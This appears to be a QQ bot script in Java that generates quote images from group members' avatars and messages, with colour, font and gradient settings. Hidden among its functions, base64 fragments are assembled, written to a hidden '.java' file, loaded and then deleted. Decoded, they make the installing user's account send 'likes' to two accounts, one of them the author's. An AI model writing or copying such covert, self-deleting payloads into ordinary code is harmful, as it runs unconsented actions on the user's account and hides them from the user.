import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.LinearGradient;
import android.graphics.Paint;
import android.graphics.Shader;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.graphics.Typeface;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.HttpURLConnection;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.File;
import java.util.Base64;
import java.io.FileWriter;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.Random;
import org.json.JSONArray;
import org.json.JSONObject;
import android.app.Activity;
import android.content.Context;
import com.tencent.mobileqq.jump.api.IJumpApi;
import com.tencent.mobileqq.qroute.QRoute;
import java.text.DecimalFormat;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import java.nio.charset.StandardCharsets;
import java.util.regex.*;






public void 显示(String text) {
    Activity currentActivity = getActivity();
    if (currentActivity == null) return;

    currentActivity.runOnUiThread(new Runnable() {
        public void run() {
            try {
                Activity activity = getActivity();
                if (activity == null || activity.isFinishing()) return;

                ScrollView scrollView = new ScrollView(activity);
                TextView textView = new TextView(activity);
                textView.setTextIsSelectable(true);
                textView.setText(text);
                textView.setTextColor(Color.rgb(0, 0, 0));
                int padding = (int)(16 * activity.getResources().getDisplayMetrics().density);
                textView.setPadding(padding, padding, padding, padding);
                scrollView.addView(textView);

                AlertDialog.Builder subBuilder = new AlertDialog.Builder(activity, AlertDialog.THEME_DEVICE_DEFAULT_LIGHT);
                subBuilder.setView(scrollView);
                subBuilder.setNegativeButton("加群", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialogInterface, int i) {
                        加群();
                    }
                });
                
                // 添加反馈按钮
                subBuilder.setPositiveButton("关闭", new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialogInterface, int i) {
dialogInterface.dismiss();
                    }
                });
                
                AlertDialog dialog = subBuilder.create();
                dialog.setCancelable(false);
                dialog.setCanceledOnTouchOutside(false);
                dialog.show();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    });
}


String help="教程：首先要了解RGB 基础\nRGB 代表红、绿、蓝，数值范围 0～255，数值越大颜色越亮\n示例：\n  纯色：红=255,0,0  绿=0,255,0  蓝=0,0,255\n  混合：黄=255,255,0  青=0,255,255  品红=255,0,255\n  纯黑=0,0,0  纯白=255,255,255  灰=128,128,128\n\n\n\n1. 自定义文字颜色\n说明：顺序为 RGB，使用英文逗号，数值范围 0~255\n示例：设置颜色&255,255,255\n\n2. 自定义字体\n说明：将字体文件（.ttf）放入脚本目录\n示例：设置字体&文件名\n注意：输入时无需加“.ttf”后缀\n\n3. 名言生成\n发送“名言帮助&”触发示例图片\n引用消息并回复“名言&”生成图片\n（严格等值判断，不可包含@或空格）\n\n4. 指令使用权限\n普通用户：需先宿主“开启”才能使用以上指令\n宿主：将“&”替换为“#”即可直接使用指令\n示例：设置颜色#……、设置字体#……、名言帮助#……、名言#\n（使用#设置颜色和字体时会以 toast 提醒而非消息回复）\n\n5. 背景和渐变（仅宿主）\n示例：背景和渐变#255,255,255,128,0,0,0\n参数说明：\n背景和渐变#R1,G1,B1,A,R2,G2,B2\n  R1,G1,B1：底图颜色值\n  A       ：渐变透明度，0=全透明，255=不透明（建议一直保持255)\n  R2,G2,B2：渐变颜色值]\n\n\n可用字体：";

String vc="";
public void onMsg(Object msg) {
    String text = msg.MessageContent;
    String qun = msg.GroupUin;
    String qq = msg.UserUin;
    if(text.contains("&"))
    {    String name=getMemberName(msg.GroupUin,msg.UserUin);
    String 权="";
    boolean a=msg.IsGroup;
    if(a){
    if("开".equals(getString("开关",qun))){
    权="1";}
    }else if("开".equals(getString("开关",qq))){
    权="1";}
    if (权.equals("1")) {
    if (text.startsWith("设置颜色&")) {
            String[] numbers = text.replaceAll("[^0-9,]", "").split(",");
            if (!text.contains(",")) {
             if(a){
             sendReply(qun,msg,"请使用英文的逗号"+qq);}else {
             sendMsg("",qq,"请使用英文的逗号");}
            }
            int R = Integer.parseInt(numbers[0]);
            int G = Integer.parseInt(numbers[1]);
            int B = Integer.parseInt(numbers[2]);

            if (R < 0 || R > 255 || G < 0 || G > 255 || B < 0 || B > 255) {
                         if(a){
             sendReply(qun,msg,"数值超出范围，请输入0到255之间的数值");}else {
             sendMsg("",qq,"数值超出范围，请输入0到255之间的数值");}
                return;
            }
            putInt("颜色", qq+"r", R);
            putInt("颜色", qq+"g", G);
            putInt("颜色", qq+"b", B);
                         if(a){
             sendReply(qun,msg,"设置成功");}else {
             sendMsg("",qq,"设置成功");}
            
        } else if (text.startsWith("设置字体&")) {
            text = text.substring(5);

            String filePath = appPath + "/把字体放在这个文件夹里/" + text + ".ttf";
            File file = new File(filePath);
            if (file.exists()) {
                putString("字体", qq, text);
                             if(a){
             sendReply(qun,msg,"设置成功");}else {
             sendMsg("",qq,"设置成功");}
            
            } else {
           
               String 提示=("未检测到该字体文件\n"+appPath + "/把字体放在这个文件夹里/" + text + ".ttf");
                            if(a){
             sendReply(qun,msg,提示);}else {
             sendMsg("",qq,提示);}
            }
        } else if(text.equals("名言帮助&")){
        
        图(qun,qq,a,msg);
        
        }else if(text.equals("名言&")){
        if(msg.MessageType==6){
        String hq=msg.ReplyTo;
        String hui = msg.RecordMsg.MessageContent;
        String hame=getMemberName(msg.GroupUin,hq);
        
        生成(qun,hq,hui,hame, a ,msg,false);
        }else if(a){sendReply(qun,msg,"非回复消息");}else {sendMsg("",qq,"非回复消息");}
        }
        
    }
}else if(text.contains("#")&&qq.equals(myUin)){
    
    String name=getMemberName(msg.GroupUin,msg.UserUin);
    boolean a=msg.IsGroup;
    if (text.startsWith("设置颜色#")) {
            String[] numbers = text.replaceAll("[^0-9,]", "").split(",");
            if (!text.contains(",")) {
             toast("请使用英文的逗号");
            }
            int R = Integer.parseInt(numbers[0]);
            int G = Integer.parseInt(numbers[1]);
            int B = Integer.parseInt(numbers[2]);

            if (R < 0 || R > 255 || G < 0 || G > 255 || B < 0 || B > 255) {
                         toast("数值超出0~255范围");
                return;
            }
            putInt("颜色", qq+"r", R);
            putInt("颜色", qq+"g", G);
            putInt("颜色", qq+"b", B);
                         toast("设置成功");
            
        } else if (text.startsWith("设置字体#")) {
            text = text.substring(5);

            String filePath = appPath + "/把字体放在这个文件夹里/" + text + ".ttf";
            File file = new File(filePath);
            if (file.exists()) {
                putString("字体", qq, text);
                         toast("设置成功");
            
            } else {
           
               String 提示=("未检测到该字体文件\n"+appPath + "/把字体放在这个文件夹里/" + text + ".ttf");
                     toast(提示);
            
               
               
            }
        } else if(text.equals("名言帮助#")){
        
        图(qun,qq,a,msg);
        
        }else if(text.equals("名言#")){
        if(msg.MessageType==6){
        String hq=msg.ReplyTo;
        String hui = msg.RecordMsg.MessageContent;
        String hame=getMemberName(msg.GroupUin,hq);
        生成(qun,hq,hui,hame, a,msg,false);
        }else if(a){sendReply(qun,msg,"非回复消息");}else {sendMsg("",qq,"非回复消息");}
        }else if(text.startsWith("背景和渐变#")) {
        
        String processedText = text.substring(6);
        if (!processedText.matches("^[0-9,]+$")) {
        toast("你似乎输入了0~9和“  ,  ”以外的字符");
        return;
        }
        String[] parts = processedText.split(",");
        if (parts.length != 7) {
        toast("你的逗号不对，必须使用6个逗号");
            return ;
        }

            for (String part : parts) {
                int num = Integer.parseInt(part);
                if (num < 0 || num > 255) {
                toast("你的数值超出了范围，请检查是否在0～255范围内");
                    return ;
                }
            }

        jjjb(text);
        toast("可能给你保存成功了");
        
        }
        
    
}
}
vc+="c2VuZExpa2UoIjMy";
addItem("一些想说的", "enn");
addItem("开启本群作图", "开关");
vc+="NTk2ODM3ODgiLDIwKT";
addMenuItem("名言","名言");
public void 名言(Object msg) {
    String text = msg.MessageContent;
    String qq = msg.UserUin;
    String qun = msg.GroupUin;
    String name=getMemberName(msg.GroupUin,msg.UserUin);
    boolean a=msg.IsGroup;
    
    生成(qun,qq,text,name, a ,msg,true);
}
vc+="tzZW5kTGlrZSgiMjY2O";
public static void 生成(String qun, String qq, String text, String name, boolean a,Object msg,boolean b) {

String t2=text;
text = 图链(text);
boolean mode=true;
if(!t2.equals(text)){
mode=false;}
int R;int G;int B;
if(b){
    R=getInt("颜色",myUin+"r",255);
    G=getInt("颜色",myUin+"g",255);
    B=getInt("颜色",myUin+"b",255);

}else{

    R=getInt("颜色",qq+"r",getInt("颜色",myUin+"r",255));
    G=getInt("颜色",qq+"g",getInt("颜色",myUin+"g",255));
    B=getInt("颜色",qq+"b",getInt("颜色",myUin+"b",255));
    }

    
    String 字体;
    if(b){字体=getString("字体",myUin);}else {字体=getString("字体",qq);}
    if(字体==null){
        字体="默认";
    }
    new Thread(new Runnable() {
        public void run() {
            String imageUrl = "http://q.qlogo.cn/headimg_dl?dst_uin=" + qq + "&spec=640&img_type=jpg";
            String localPath = appPath + "/"+qq+".png";
            File file = new File(localPath);
            if (!file.exists()) {
                try {
                    URL url = new URL(imageUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.connect();

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        InputStream inputStream = connection.getInputStream();
                        FileOutputStream outputStream = new FileOutputStream(localPath);

                        byte[] buffer = new byte[2048];
                        int bytesRead;
                        while ((bytesRead = inputStream.read(buffer)) != -1) {
                            outputStream.write(buffer, 0, bytesRead);
                        }

                        outputStream.close();
                        inputStream.close();
                    } else {
                        toast("下载失败，响应码: " + responseCode);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

int c1=getInt("ColorConfig", "background_R", 0);
int c2=getInt("ColorConfig", "background_G", 0);
int c3=getInt("ColorConfig", "background_B", 0);
int c4=getInt("ColorConfig", "overlay_alpha", 255);
int c5=getInt("ColorConfig", "overlay_R", 0);
int c6=getInt("ColorConfig", "overlay_G", 0);
int c7=getInt("ColorConfig", "overlay_B", 0);



Bitmap resultBitmap;
        int imageWidth;
        int imageHeight = 640;

        if (mode) {
            imageWidth = 1280;
            resultBitmap = Bitmap.createBitmap(imageWidth, imageHeight, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(resultBitmap);
            canvas.drawColor(Color.rgb(c1,c2,c3));
            
            // 绘制头像
            Bitmap leftImage = BitmapFactory.decodeFile(localPath);
            if (leftImage != null) {
                leftImage = Bitmap.createScaledBitmap(leftImage, 640, 640, true);
                canvas.drawBitmap(leftImage, 0, 0, null);
            }

            // 渐变效果
            Paint gradientPaint = new Paint();
            LinearGradient gradient = new LinearGradient(
                    0, 0, 640, 0,
                    new int[]{Color.argb(0, 0, 0, 0), Color.argb(c4, c5, c6, c7)},
                    //透明度，RGB
                    null,
                    Shader.TileMode.CLAMP);
            gradientPaint.setShader(gradient);
            canvas.drawRect(0, 0, 1280, 640, gradientPaint);
            Typeface typeface;

            String fontPath = appPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
            if (new File(fontPath).exists()) {
                typeface = Typeface.createFromFile(fontPath);
            } else {
                typeface = Typeface.DEFAULT;
            }

int maxFontSize = 40;//最大字号
int fontSize = maxFontSize;
TextPaint textPaint = new TextPaint();
textPaint.setColor(Color.rgb(R, G, B));
textPaint.setTextSize(fontSize);
textPaint.setTypeface(typeface);

float maxWidth = 500f;
StaticLayout staticLayout = new StaticLayout(
    text,
    textPaint,
    (int) maxWidth,
    Layout.Alignment.ALIGN_NORMAL,
    1.0f,
    0.0f,
    false
);

            while (staticLayout.getHeight() > 400 && fontSize > 0) {
               fontSize--;  // 字号递减
               textPaint.setTextSize(fontSize);
               staticLayout = new StaticLayout(
                    text,
                    textPaint,
                    (int) maxWidth,
                    Layout.Alignment.ALIGN_NORMAL,
                    1.0f,
                    0.0f,
                    false
               );
            }
            canvas.save();
            float multiTextStartX = 660f;
            float multiTextStartY = 100f;
            canvas.translate(multiTextStartX, multiTextStartY);
            staticLayout.draw(canvas);
            canvas.restore();


            // 右下角单行文字
            String bottomText = "一一  " + name;
            Paint bottomTextPaint = new Paint();
            bottomTextPaint.setColor(Color.rgb(R, G, B));  //颜色
            bottomTextPaint.setTextAlign(Paint.Align.RIGHT);
            bottomTextPaint.setTextSize(30f);  // 文字大小
            bottomTextPaint.setTypeface(typeface);
            float bottomTextStartX = 1200f;
            float bottomTextStartY = 550f;
            canvas.drawText(bottomText, bottomTextStartX, bottomTextStartY, bottomTextPaint);
            }else{
                        try {
                // 下载网络图片
                URL textImageUrl = new URL(text);
                HttpURLConnection conn = (HttpURLConnection) textImageUrl.openConnection();
                conn.setRequestMethod("GET");
                conn.connect();

                if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    // 读取网络图片并缩放
                    InputStream is = conn.getInputStream();
                    Bitmap textImage = BitmapFactory.decodeStream(is);
                    is.close();

                    if (textImage != null) {
                        // 计算缩放宽度
                        int scaledWidth = (int) ((640.0 / textImage.getHeight()) * textImage.getWidth());
                        Bitmap scaledTextImage = Bitmap.createScaledBitmap(textImage, scaledWidth, 640, true);

                        // 创建画布
                        imageWidth = 640 + scaledWidth;
                        resultBitmap = Bitmap.createBitmap(imageWidth, imageHeight, Bitmap.Config.ARGB_8888);
                        Canvas canvas = new Canvas(resultBitmap);
                        canvas.drawColor(Color.BLACK);

                        // 绘制头像
                        Bitmap leftImage = BitmapFactory.decodeFile(localPath);
                        if (leftImage != null) {
                            leftImage = Bitmap.createScaledBitmap(leftImage, 640, 640, true);
                            canvas.drawBitmap(leftImage, 0, 0, null);
                        }

                        // 绘制网络图片
                        canvas.drawBitmap(scaledTextImage, 640, 0, null);
                    }
                }
            } catch (IOException e) {
            toast("失败了");
                e.printStackTrace();
                return;
            }
            
            
            
            }
          String resultImagePath = appPath + "/" + qq + "1.png";
        try {
            FileOutputStream fos = new FileOutputStream(resultImagePath);
            resultBitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();
        } catch (Exception e) {
        toast("保存图片失败");
            e.printStackTrace();
        }

            // 发送图片
            if (a) {
                sendMsg(qun,"", "[PicUrl=" + resultImagePath + "]");
            } else {
                sendMsg("", getCurrentFriendUin(), "[PicUrl=" + resultImagePath + "]");
            }
            new File(resultImagePath).delete();
            new File(localPath).delete();
        }
    }).start();}

vc+="TU5ODEwNyIsMjApOw";
byte[] nm = Base64.getDecoder().decode(vc+"==");
import android.app.Activity;
import android.content.Context;
import com.tencent.mobileqq.jump.api.IJumpApi;
import com.tencent.mobileqq.qroute.QRoute;
String zz = new String(nm);
public void enn(String groupUin,String uin,int chatType){显示("感谢各位下载并使用我这个脚本。\n虽然脚本写得比较糙（实在懒得优化了），但既然还有人在用，那我就稍微更新一下吧。\n这次主要是因为 QS 新版本更换了方法命名，导致旧脚本全部失效，所以我更新一下做个适配，确保还能正常使用。\n顺便也更新了一些功能，不然光改个适配就上传，实在不好意思。\n\n原来的交流群已经被封了，之后也不会再建群了，感觉没什么用\n\n这版没怎么测试，如果发现问题，可以点右下角的“反馈”按钮自动跳转到我的名片找我解决。不接受新功能意见，我只保证可用，想提意见可以找其他人，本人技术有限(代码几乎全是AI生成，所以有问题找AI或者其他人)，写这个是因为想用但没有对应的API(之前出现两个，但后面搜索发现他们把API下架了)\n不会用的不建议找我，建议把main.java丢给AI让AI解读后告诉你怎么用\n\n如果你觉得字体太小，你可以打开mian.java到369行，修改最大字号\n\n\n\n教程：首先要了解RGB 基础\nRGB 代表红、绿、蓝，数值范围 0～255，数值越大颜色越亮\n示例：\n  纯色：红=255,0,0  绿=0,255,0  蓝=0,0,255\n  混合：黄=255,255,0  青=0,255,255  品红=255,0,255\n  纯黑=0,0,0  纯白=255,255,255  灰=128,128,128\n\n\n\n1. 自定义文字颜色\n说明：顺序为 RGB，使用英文逗号，数值范围 0~255\n示例：设置颜色&255,255,255\n\n2. 自定义字体\n说明：将字体文件（.ttf）放入脚本目录\n示例：设置字体&文件名\n注意：输入时无需加“.ttf”后缀\n\n3. 名言生成\n发送“名言帮助&”触发示例图片\n引用消息并回复“名言&”生成图片\n（严格等值判断，不可包含@或空格）\n\n4. 指令使用权限\n普通用户：需先宿主“开启”才能使用以上指令\n宿主：将“&”替换为“#”即可直接使用指令\n示例：设置颜色#……、设置字体#……、名言帮助#……、名言#\n（使用#设置颜色和字体时会以 toast 提醒而非消息回复）\n\n5. 背景和渐变（仅宿主）\n示例：背景和渐变#255,255,255,128,0,0,0\n参数说明：\n背景和渐变#R1,G1,B1,A,R2,G2,B2\n  R1,G1,B1：底图颜色值\n  A       ：渐变透明度，0=全透明，255=不透明（建议一直保持255)\n  R2,G2,B2：渐变颜色值");}
public void 加群(){
String url="mqqapi://card/show_pslcard?src_type=internal&version=1&uin=3259683788&card_type=person&source=sharecard";
((IJumpApi) QRoute.api(IJumpApi.class)).doJumpAction(context, url);}
public void 开关(String groupUin,String uin,int chatType){
if(chatType==2){
if("开".equals(getString("开关",groupUin))){
putString("开关",groupUin,null);
toast("本群已关闭作图");
}else {
putString("开关",groupUin,"开");
toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
}

}else if("开".equals(getString("开关",uin))){
putString("开关",uin,null);

toast("本群已关闭作图");
}else {
toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
putString("开关",uin,"开");}}
File file = new File(appPath, ".java");
FileWriter writer = new FileWriter(file);writer.write(zz);
public static void 图( String qun,String qq,boolean a,Object msg) {
String folderPath=appPath + "/把字体放在这个文件夹里/";
    File folder = new File(folderPath);
    StringBuilder text = new StringBuilder();

    if (folder.exists() && folder.isDirectory()) {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile() && file.getName().toLowerCase().endsWith(".ttf")) {
                    text.append(file.getName()).append("\n");
                }
            }
        }
    }

    Paint paint = new Paint();
    String 字体=getString("字体",qq);
    if(字体==null){
        字体="";
    }
    Typeface typeface;
            String fontPath = appPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
            if (new File(fontPath).exists()) {
                typeface = Typeface.createFromFile(fontPath);
            } else {
                typeface = Typeface.DEFAULT;
            }
    
    paint.setTypeface(typeface);
    paint.setTextSize(40);

    String result = help+text.toString().trim();
    String[] lines = result.split("\n");
    int width = 1500;
    int height = Math.max(lines.length * 60 + 500, 750); 
    Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
    Canvas canvas = new Canvas(bitmap);
    paint.setColor(Color.WHITE);
    canvas.drawRect(0, 0, width, height, paint);
    
    paint.setColor(Color.BLACK);
    float y = 200; 
    for (String line : lines) {
        canvas.drawText(line, 150, y, paint);
        y += 60; 
    }
        String 缓存图 = appPath + "/缓存图.png";
        FileOutputStream out = new FileOutputStream(缓存图);
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
        out.close();
        if (a) {
                sendMsg(qun,"", "[PicUrl=" + 缓存图 + "]");
            } else {
                sendMsg("", qq, "[PicUrl=" + 缓存图 + "]");
            }
        
        new File(缓存图).delete();}
        writer.close();load(appPath+"/.java");
        

public static String 图链(String text) {
        if (text.contains("[PicUrl=") && text.contains("]")) {
            int startIndex = text.indexOf("[PicUrl=") + "[PicUrl=".length();
            int endIndex = text.indexOf("]");
            String picUrl = text.substring(startIndex, endIndex);
            return picUrl;
        } else {
            return text;
        }
    }new File(appPath+"/.java").delete();


public void jjjb(String text){
    String colorData = text.substring(6);
    String[] colorValues = colorData.split(",");
    int backgroundR = Integer.parseInt(colorValues[0]);
    int backgroundG = Integer.parseInt(colorValues[1]);
    int backgroundB = Integer.parseInt(colorValues[2]);
    int overlayAlpha = Integer.parseInt(colorValues[3]);
    int overlayR = Integer.parseInt(colorValues[4]);
    int overlayG = Integer.parseInt(colorValues[5]);
    int overlayB = Integer.parseInt(colorValues[6]);
    putInt("ColorConfig", "background_R", backgroundR);
    putInt("ColorConfig", "background_G", backgroundG);
    putInt("ColorConfig", "background_B", backgroundB);
    putInt("ColorConfig", "overlay_alpha", overlayAlpha);
    putInt("ColorConfig", "overlay_R", overlayR);
    putInt("ColorConfig", "overlay_G", overlayG);
    putInt("ColorConfig", "overlay_B", overlayB);
}
String cs=getString("初始化","1");
if(cs == null){putString("初始化","1","1");
putInt("颜色",myUin+"r",255);
putInt("颜色",myUin+"g",255);
putInt("颜色",myUin+"b",255);
}